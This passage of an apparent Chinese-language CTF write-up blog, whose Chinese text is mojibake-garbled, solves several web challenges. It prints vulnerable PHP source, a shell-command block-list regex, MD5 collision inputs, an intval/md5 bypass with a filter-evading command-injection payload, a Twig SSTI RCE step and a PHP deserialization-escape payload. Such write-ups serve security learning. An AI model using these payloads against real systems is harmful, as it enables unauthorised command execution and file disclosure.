class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ å‚çš„å†…å®¹åŠç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls</span><br><span class="line">forbid ~</span><br><span class="line"></span><br><span class="line">?cmd=l\s</span><br><span class="line">l\s</span><br><span class="line"></span><br><span class="line">?cmd=\</span><br><span class="line">\</span><br></pre></td></tr></table></figure><p>å¯¹åæ–œæ ä¸è¿›è¡Œç¦æ­¢ï¼Œåœ¨linuxä¸­åæ–œæ ä¹Ÿä¸å½±å“å‘½ä»¤çš„æ‰§è¡Œ</p><p><img src="../images/image-20230407210831767.png" alt="image-20230407210831767"></p><p>è¿™æ ·ï¼Œå‰é¢çš„åæ–œæ å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œåé¢åæ–œæ è¿˜ä¸å½±å“å‘½ä»¤çš„æ­£å¸¸æ‰§è¡Œï¼Œé‚£è¿™ä¸å°±ç­‰äºè¿‡æ»¤äº†ä¸ªå¯‚å¯å˜›ã€‚</p><p>è¿‡äº†preg_matchçš„æ£€æµ‹ï¼Œæœ€åä¸€æ­¥å°±æ˜¯è¿‡md5çš„å¼ºç¢°æ’äº†ï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„æ ¸å¿ƒã€‚</p><p>ä¹‹å‰åšçš„md5çš„é¢˜ä¹Ÿç”¨äº†md5çš„å¼ºç¢°æ’ï¼ˆå‡†ç¡®æ¥è®²åº”è¯¥å«å¼ºæ¯”è¾ƒï¼‰ï¼Œå½“æ—¶æ˜¯ç”¨ä¼ æ•°ç»„çš„æ–¹æ³•é€šè¿‡æ£€æµ‹çš„ï¼Œè€Œç°åœ¨ä¸å¯ä»¥è¿™æ ·åšäº†ï¼Œå› ä¸ºä»–å¤šäº†ä¸€æ­¥å¼ºè½¬çš„æ“ä½œï¼Œè¿™æ­¥æ“ä½œå°±ä¼šä½¿æ•°ç»„å¤±æ•ˆï¼Œæ‰€ä»¥å¾—æ‰¾å·¥å…·æˆ–è€…æ‰¾åˆ«äººæä¾›çš„å¯ä»¥è¿›è¡Œmd5å¼ºç¢°æ’çš„å†…å®¹æ¥æµ‹è¯•äº†ã€‚</p><p>è¿™é‡Œæ‰¾åˆ°ä¸¤ç§ç‰ˆæœ¬ï¼Œç”¨è°éƒ½ä¸€æ ·ï¼ˆä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ä»–ä¸¤æ˜¯ä¸€æ ·çš„ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾—éœ€è¦ç”¨burpsuitæ¥ä¼ å‚</p><p><img src="../images/image-20230407211239049.png" alt="image-20230407211239049"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>é¢˜ç›®</p><p> <img src="../images/image-20230407211403556.png" alt="image-20230407211403556"></p><p>æ‰«ç›®å½•å‘ç°robots.txtæ–‡ä»¶</p><p><img src="../images/image-20230407211447353.png" alt="image-20230407211447353"></p><p>å‘ç°æœ‰ä¸ªphpæ–‡ä»¶</p><p><img src="../images/image-20230407211509028.png" alt="image-20230407211509028"></p><p>å’Œåå­—æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯ä¸€ä¸ªå‡çš„flag</p><p>ç„¶åå¯¹è¿™ä¸ªé¡µé¢è¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="../images/image-20230407211626979.png" alt="image-20230407211626979"></p><p>å‘ç°å›åº”å¤´æœ‰ä¸ªæ–‡ä»¶</p><p><img src="../images/image-20230407211709477.png" alt="image-20230407211709477"></p><p>è¯»åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;é´æˆœç¬‰ç¼å¿”å‰°é—‚å¯¸æ¹…æµœå—™æ¹…é´æˆ æ®‘é”å†²å§æ¾¹ï¿½, æ¶“å¶†æ§¸é¯å´‡æ¹…éƒå •æ£¿, é™î…æ§¸é¯å……ç¬‰ç¼å¿”å‰°é—‚ï¿½, ç’â•€ç¶˜é­ãƒ©äº¾é´æˆ£ç¹ƒå¯°æ¥ç˜®æµ£çŠ²ã‚½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é–²æˆ¦æŒ¶ç‘™ï½…å–…æ¶“å¶„ç°¡ç»Œèœ‚æ±‰é¨å‹¬æ¹°ç’ã„©æ£¶æ£°ï¿½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;é¯å†²åŸŒæ©æ¬é‡œCTFeré·å®åŸŒflagéšï¿½, é°ç†¸ç¸ºå¨‘æ›¢æµ‚, ç’ºæˆå¹“æ¶“æ»„ç·¶å®€ï¿½, éµå¥ç«´ç€¹å •î˜µé˜ï¿½, é¶å©‚å¸¹ç”¯å £æ¡¨é‘å“„å¹“, é‘·î„ç¹éæè¢±æ¶“î…å¬éµå¬ªçš¬é‘¿ï¿½, éŠæç«´é‰îˆ›æšç‘å‘¯æ«§é–°ï¿½, é‘·æ‘ç˜œéˆå¤äº¾, é’î‚¢î„Ÿçå¿”æ¯š.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;é´æˆ£åˆ€ç»±Ñƒæˆé‰ãƒ¦åœé¨å‹¯å­é‘²å¤‹æ¹…é™ï¿½, æµ æ ¨å¢¦æµœå—•é‡œé¢ä½ƒç˜½, é¶å©ç²¬æ¶“â‚¬ç€¹è·ºç•¨éºæ‘åŸŒæµœå—›æ½ªå¨²ï¿½&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;é¯å†²åŸŒæ©æ¬“å™·, é´æˆå–ç€¹ç‚¶â‚¬å±¾î‚¾é±ï¿½, éˆå¤æŒ¶æµœè™¹æ®‘è¹‡î‚¡ç®°å¯°â‚¬å¯°â‚¬çè¾¨æ§¸æ©æ¬ç®é¨å‹¬æ¹¸ç€¹ç‚´æ£¤é—ï¿½, æ¶“æ—€çŸé•ï¿½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¹‡î‚¢åŸŒé—ˆç‚´åºŠæµœï¿½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç»•è¿‡ifåˆ¤æ–­</p><p><strong>level1</strong></p><p>è¿›è¡Œåˆ†ælevel 1å‘ç°æ˜¯intvalå‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨å¤„ç†æ•°æ®æ—¶ä¼šåœ¨æ¥è§¦åˆ°å­—ç¬¦ä¸²æ—¶åœæ­¢ï¼Œå› æ­¤å¦‚æœè¾“å…¥100e2ä¹‹ç±»çš„æ•°æ®ï¼Œä¼šè§£é‡Šç§°100ï¼Œä½†åé¢åœ¨æ‰§è¡Œ+1æ—¶ï¼Œ100e2æ˜¯è§£é‡Šç§°10000çš„ï¼Œå› æ­¤æ­¤å¤„ä½¿ç”¨100e2ç»•è¿‡</p><p><strong>level2</strong></p><p>è¿›è¡Œåˆ†ælevel 2å‘ç°æ˜¯md5çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œ==åœ¨æ¯”è¾ƒæ•°æ®çš„æ—¶å€™ä¼šè¿›è¡Œç±»å‹çš„è½¬æ¢ï¼Œå› æ­¤åªéœ€è¦æŸ¥æ‰¾è¿™ç§æ•°æ®å°±è¡Œï¼Œæ­¤å¤„é‡‡ç”¨ï¼š0e215962017ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p>ç±»å‹è½¬åŒ–åä¸¤ä¸ªéƒ½ä¸º0,æ‰€ä»¥ç›¸ç­‰</p><p><strong>level3</strong></p><p><img src="../images/image-20230407212708516.png" alt="image-20230407212708516"></p><p><strong>strstr</strong>    çš„æ„æ€ </p><p><img src="../images/image-20230407212749188.png" alt="image-20230407212749188"></p><p>ç¬¬ä¸‰å¤„è¿‡æ»¤ï¼Œå¯¹catå’Œç©ºæ ¼è¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤å…ˆé‡‡ç”¨lsæˆ–diræ¥è·å–ç›®å½•ä¿¡æ¯</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fl4g.php?num=<span class="number">100e2</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=ca\t$IFS$<span class="number">1</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>é¢˜ç›®</p><p><a href="https://www.hetianlab.com/specialized/20211217155625">ä»¥Twigæ¨¡æ¿ä¸ºä¾‹æµ…å­¦ä¸€æ‰‹SSTI</a></p><p><img src="../images/image-20230407213346332.png" alt="image-20230407213346332"></p><p>åœ¨flagé¡µé¢è¿›è¡Œå°è¯•çš„æ—¶å€™å‘ç°ï¼Œè¿™ä¸ªæ¨¡æ¿æ˜¯     Twig æ¨¡æ¿å¼•æ“</p><p>ä¹Ÿå°±æ˜¯è¯´æ˜¯è€ƒæŸ¥sstiçš„</p><p>å°è¯•RCE ,å‘ç°ä¼¼ä¹ä¼šæ£€æµ‹è¾“å…¥çš„å†…å®¹</p><p><img src="../images/image-20230407213639935.png" alt="image-20230407213639935"></p><p>é¢˜ç›®æç¤ºæ˜¯cookie,é‚£æˆ‘ä»¬å°±å»cookieå¤„çœ‹çœ‹</p><p><img src="../images/image-20230407213815921.png" alt="image-20230407213815921"></p><p>é‚£æˆ‘ä»¬å°±å°è¯•åœ¨userå¤„è¿›è¡ŒRCE</p><p><img src="../images/image-20230407214049562.png" alt="image-20230407214049562"></p><p>æ‹¿åˆ°flag</p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230407214558920.png" alt="image-20230407214558920"></p><p>ç»™äº†ä¸€ä¸ªæç¤ºï¼Œè¯´æ˜¯ç½‘ç«™æºç </p><p>ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹</p><p>è¶³è¶³æœ‰36ä¸‡è¡Œä»£ç </p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¾—å†™ä¸ªè„šæœ¬æ¥æŸ¥çœ‹ä¸€ä¸‹å“ªäº›æ˜¯æœ‰ç”¨çš„äº†</p><p>è¿™é“é¢˜å°±æ˜¯è€ƒå¯Ÿè„šæœ¬çš„ç¼–å†™èƒ½åŠ›</p><p><a href="https://www.wangan.com/docs/268">å¤§ä½¬å†™çš„wp</a></p><p>çœ‹å¤§ä½¬å†™çš„å°±è¡Œäº†</p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230407215924361.png" alt="image-20230407215924361"></p><p>æ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè®©å‚æ•°fç­‰äºâ€œphpinfoâ€ï¼Œå› ä¸ºé¢˜ç›®æç¤ºè¯´è¿™é‡Œå¯èƒ½ä¼šæ‰¾åˆ°äº›ä¸œè¥¿ã€‚</p><p>åœ¨phpinfoé‡Œçœ‹åˆ°äº†è¿™ä¸ªï¼š</p><p><img src="../images/image-20230408190916573.png" alt="image-20230408190916573"></p><p>æç¤ºæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆç°å°è¯•ä¸€ä¸‹ç›´æ¥è¯»å–  é‚£ä¸€èˆ¬æ¥è¯´è‚¯å®šæ˜¯è¯»å–ä¸åˆ°çš„</p><p><strong>å¾ˆæ˜æ˜¾æ˜¯è¦è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œä»£ç é‡Œè¯»å–æ–‡ä»¶çš„åœ°æ–¹åœ¨è¿™é‡Œï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–çš„æ˜¯base64è§£ç åçš„$userinfo[â€˜imgâ€™]ï¼Œ$userinfoçš„å€¼æ˜¯$serialize_infoçš„ååºåˆ—åŒ–å¯¹è±¡ï¼Œ$serialize_infoæ˜¯ç»è¿‡è‡ªå®šä¹‰å‡½æ•°è¿‡æ»¤çš„åºåˆ—åŒ–åçš„$_SESSIONã€‚</p><p>è¿™ä¸ªè‡ªå®šä¹‰å‡½æ•°filteræƒ¹ç¥¸äº†ï¼Œè€ƒå¯Ÿäº†çŸ¥è¯†ç‚¹ï¼š<strong>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚</strong></p><p>åªèƒ½è®©img_pathä¸ºç©ºï¼Œå¹¶æŠŠguest_img.pngé€ƒé€¸å‡ºå»ã€‚</p><p>å…ˆæœ¬åœ°æµ‹è¯•ï¼Œçœ‹çœ‹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆæ ·çš„:</p><p><img src="../images/image-20230408192908200.png" alt="image-20230408192908200"></p><p>ç„¶åæ˜¯å˜é‡è¦†ç›–åçš„åºåˆ—åŒ–ç»“æœ</p><p><img src="../images/image-20230408193210085.png" alt="image-20230408193210085"></p><p>è¿™é‡Œå°±æ˜¯å…³é”®äº†ï¼Œå¯ä»¥è®©ä¼ è¿›æ¥çš„å€¼ä½¿å¾—è¦†ç›–æ‰åé¢çš„imgå†…å®¹ï¼Œå› ä¸ºæœ‰filterå‡½æ•°ä¼šè¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…åˆ°æ›¿æ¢ä¸ºç©ºï¼Œç„¶åç”¨æ¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸å˜ï¼Œå°±ä¼šæ¥ç€åŒ¹é…é€‚åˆçš„é•¿åº¦ï¼Œè¿™ä¸ªé€‚åˆçš„é•¿åº¦æˆ‘ä»¬å°±å¾—è¿›è¡Œè®¡ç®—ï¼Œç„¶åä½¿å¾—imgé‡Œçš„å€¼ä¸ºflagçš„base64ç¼–ç å€¼</p><p>(å’Œshowçš„å­—ç¬¦ä¸²é€ƒé€¸å·®ä¸å¤š)</p><p><img src="../images/image-20230408193734376.png" alt="image-20230408193734376"></p><p>è¿™æ˜¯æˆ‘ä»¬è¦ä¼ çš„å€¼</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[imgphpflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–åçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:10:&quot;img&quot;;s:50:&quot;;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯</strong></p><p>å°±æ˜¯æŠŠè‡ªå·±åœ¨æœ¬åœ°åˆ›å»ºå¥½çš„payloadå†™ä¸Šå»ï¼Œç„¶åæ ¹æ®ä¼ çš„å‚æ•°åå­—çš„payload</p><p>é•¿åº¦è®¡ç®—å¥½ï¼Œç„¶ååœ¨ä¼ è¿›å»ä¸€ä¸ªé‚£ä¸ªå˜é‡çš„å†…å®¹ï¼Œç„¶ååœ¨æŠŠåé¢çš„imgä¼ è¿›å»å°±å¥½äº†<br><strong>èƒ½çœ‹æ‡‚åºåˆ—åŒ–å‡ºæ¥çš„ä¸œè¥¿æ˜¯å’‹æ ·ç»„æˆçš„å°±è¡Œ</strong></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230408200347832.png" alt="image-20230408200347832"></p><p>ä¸€ä¸ªè´­ä¹°ä¸œè¥¿çš„å¹³å°</p><p><img src="../images/image-20230408200457185.png" 